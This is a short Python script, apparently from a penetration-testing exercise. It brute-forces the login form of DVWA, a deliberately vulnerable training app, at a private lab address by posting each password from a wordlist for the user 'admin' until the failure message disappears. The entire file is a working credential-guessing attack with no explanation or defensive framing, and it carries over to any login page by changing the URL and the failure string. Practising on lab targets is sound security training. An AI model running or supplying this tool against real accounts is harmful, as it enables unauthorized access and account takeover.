#!usr/bin/env python

import requests

target_url = "http://192.168.111.154/dvwa/login.php"
data_dict = {"username":"admin","password":"","Login":"submit"}
with open("passwords.txt","r") as password_file :
    for line in password_file :
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data_dict)
        if "Login failed" not in response.content.decode() :
            print("[+] Got the password ---> " + word)
            exit()

print("[+] Reached end of line.\n[+] Not Found password!.")